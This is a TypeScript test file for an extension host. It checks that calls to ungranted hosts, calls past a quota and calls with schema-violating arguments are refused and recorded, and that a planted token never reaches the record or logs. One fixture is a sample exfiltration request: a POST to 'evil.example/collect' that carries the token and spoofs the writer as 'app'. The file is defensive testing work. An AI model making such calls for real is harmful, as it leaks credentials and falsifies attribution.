// AC6: an extension that calls a host its grant doesn't name, with `writer: "app"` and a planted token in its
// arguments, is refused, and the record holds one capability.refused whose writer is `ext:<its ID>`, naming the grant
// clause and the call's digest; the token appears nowhere in the record, the evidence or the logs; a host that takes
// the writer from the arguments records `app` and fails. AC7: a call past its quota and a call whose arguments fail
// the action's schema each append their own capability.refused, naming the quota or the schema field.
//
// The outside calls go through deep.fetch, which the host makes for the package (README, The surface under test). The
// only host a grant here names is a server this test runs on 127.0.0.1, so nothing leaves the machine; the call to a
// host the grant doesn't name is refused before any network. The token is built inside the package from a seed, so
// its bytes are in none of the package's files, and every file the world, the package and the temp HOME hold is
// searched for them, after a sync, and again after the host and the record closed.
import { randomBytes } from 'node:crypto';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { describe, expect, it } from 'vitest';
import type { Plant } from '../../../packages/extension-host/src/index.ts';
import type { Event } from '../../../packages/record/src/index.ts';
import { toJson } from '../../../packages/record/src/index.ts';
import { filesHolding, HEADLESS, home, installAndLoad, openHost, openWorld, pkg, report, type World } from './helpers.ts';
import { judgeRefusal } from './judges.ts';

const HOUR = 3_600_000;
const CALLER = 'test/caller';
const DIGEST = /^(d1:|sha256:)?[0-9a-f]{64}$/;

/** A server on 127.0.0.1 standing in for a host a grant names; it counts what reaches it. */
async function grantedHost(): Promise<{ host: string; count: () => number; server: Server }> {
  let n = 0;
  const server = createServer((req, res) => { n++; req.resume(); res.writeHead(200, { 'content-type': 'text/plain' }).end('pong'); });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  return { host: `127.0.0.1:${(server.address() as AddressInfo).port}`, count: () => n, server };
}
const closeServer = (server: Server) => new Promise<void>((resolve) => { server.close(() => resolve()); server.closeAllConnections(); });

describe('AC6 #350.7884cbb1 a call to a host the grant doesn\'t name, with writer "app" and a planted token in its arguments, is refused and recorded once as capability.refused by ext:<its ID>, naming the grant clause and the call\'s digest, with the token nowhere in the record, evidence or logs; a host that takes the writer from the arguments records app and fails', () => {
  interface Scenario { w: World; dir: string; seed: string; token: string; outcomes: { ok: boolean }[]; refusals: Event[]; close(): Promise<void> }
  async function scenario(plant?: Plant): Promise<Scenario> {
    let seed = randomBytes(12).toString('hex');
    while (seed === [...seed].reverse().join('')) seed = randomBytes(12).toString('hex');
    const token = `PLANTED-${[...seed].reverse().join('')}`;
    const granted = await grantedHost();
    const call = {
      url: 'https://evil.example/collect?t=$TOKEN', method: 'POST',
      headers: { writer: 'app', actor: 'mallory', authorization: 'Bearer $TOKEN' },
      body: '{"writer":"app","actor":"mallory","token":"$TOKEN"}',
      writer: 'app', actor: 'mallory',
    };
    const dir = await pkg('caller', { probe: { seed, calls: [call] } });
    const w = await openWorld();
    const h = await openHost(w, plant ? { plant } : {});
    await installAndLoad(h, dir, { hosts: [{ host: granted.host, quota: { calls: 10, per_ms: HOUR } }] });
    const { outcomes } = await report<{ outcomes: { ok: boolean }[] }>(h, 'ext.caller.report');
    await w.record.sync();
    expect(granted.count(), 'the granted host was never called').toBe(0);
    await closeServer(granted.server);
    return { w, dir, seed, token, outcomes, refusals: await w.events('capability.refused'), close: async () => { await h.close(); await w.close(); } };
  }

  it('AC6 the call is refused, and the record holds one capability.refused written by ext:test/caller, naming the grant clause and the call\'s digest', async () => {
    const { outcomes, refusals, token } = await scenario();
    expect(outcomes, 'the call to a host its grant doesn\'t name went through').toEqual([{ ok: false }]);
    expect(judgeRefusal(refusals, CALLER, token)).toEqual([]);
  }, 120_000);

  it('AC6 the planted token appears nowhere in the record, the evidence or the logs, on disk or read back', async () => {
    const { w, dir, seed, token, outcomes, refusals, close } = await scenario();
    expect(outcomes).toEqual([{ ok: false }]);
    // The search means something only once the refused call reached the host and was recorded.
    expect(refusals.map((e) => e.writer), 'the refusal on record').toEqual([`ext:${CALLER}`]);
    const all = await w.events();
    expect(all.filter((e) => toJson(e).includes(token)).map((e) => e.kind), 'events carrying the token').toEqual([]);
    const roots = [w.dir, dir, home()];
    expect(filesHolding(seed, [dir]).length, "the search finds bytes that are there: the seed in probe.json").toBeGreaterThan(0);
    expect(filesHolding(token, roots), 'files holding the token, with the record open').toEqual([]);
    await close();
    expect(filesHolding(token, roots), 'files holding the token, after the host and the record closed').toEqual([]);
  }, 120_000);

  it('AC6 (wrong program) a host that takes the writer from the arguments records app and fails this test', async () => {
    const { refusals, token } = await scenario('writer-from-arguments');
    const problems = judgeRefusal(refusals, CALLER, token);
    expect(problems.some((p) => p.includes('writer is app')), JSON.stringify(problems)).toBe(true);
  }, 120_000);
});

describe('AC7 #350.b5c18039 a call past its quota and a call whose arguments fail the action\'s schema each append their own capability.refused, naming the quota or the schema field', () => {
  it('AC7 the third call to a host granted two is refused and recorded naming the quota; an action call with a count that isn\'t an integer is refused and recorded naming the field', async () => {
    const granted = await grantedHost();
    const ping = { url: `http://${granted.host}/ping`, method: 'GET' };
    const w = await openWorld();
    const h = await openHost(w);
    await installAndLoad(h, await pkg('caller', { probe: { calls: [ping, ping, ping] } }), { hosts: [{ host: granted.host, quota: { calls: 2, per_ms: HOUR } }] });
    await installAndLoad(h, await pkg('acts'));

    const { outcomes } = await report<{ outcomes: { ok: boolean; status?: number }[] }>(h, 'ext.caller.report');
    expect(outcomes, 'two calls within the quota, the third past it').toEqual([{ ok: true, status: 200 }, { ok: true, status: 200 }, { ok: false }]);
    expect(granted.count(), 'calls that reached the granted host').toBe(2);
    await closeServer(granted.server);

    const target = { handle: 'ext:test/acts', version: '1.0.0' };
    const bad = await h.callAction({ action: 'ext.acts.bump', target, input: { count: 'three' }, caller: HEADLESS });
    expect(bad.status, `arguments its schema refuses: ${JSON.stringify(bad)}`).toBe('refused');
    const good = await h.callAction({ action: 'ext.acts.bump', target, input: { count: 3 }, caller: HEADLESS });
    expect(good, 'the refused call never ran the action').toMatchObject({ status: 'done', output: { count: 3, bumps: 1 } });

    await w.record.sync();
    const refusals = await w.events('capability.refused');
    expect(refusals.length, `capability.refused events: ${JSON.stringify(refusals.map((e) => e.data))}`).toBe(2);
    const quota = refusals.find((e) => (e.data as { broke?: string }).broke === 'quota');
    const schema = refusals.find((e) => (e.data as { broke?: string }).broke === 'schema');
    expect(quota, 'a capability.refused naming the quota').toBeDefined();
    expect(schema, 'a capability.refused naming the schema').toBeDefined();
    const q = quota!.data as { clause: string; digest: string };
    const s = schema!.data as { clause: string; digest: string };
    expect(quota!.writer, 'the quota refusal\'s writer, from the connection').toBe(`ext:${CALLER}`);
    expect(q.clause.includes(granted.host) || /\b2\b/.test(q.clause), `the limit it broke, by its host or its count: ${q.clause}`).toBe(true);
    expect(schema!.writer, 'the schema refusal\'s writer, from the caller\'s connection').toBe(HEADLESS.writer);
    expect(s.clause, 'the schema field it broke').toMatch(/\bcount\b/);
    expect(q.digest).toMatch(DIGEST);
    expect(s.digest).toMatch(DIGEST);
    expect(q.digest, 'each call has its own digest').not.toBe(s.digest);
    expect(JSON.stringify(schema!.data), 'the schema refusal carries the call\'s values').not.toContain('three');
  }, 120_000);
});
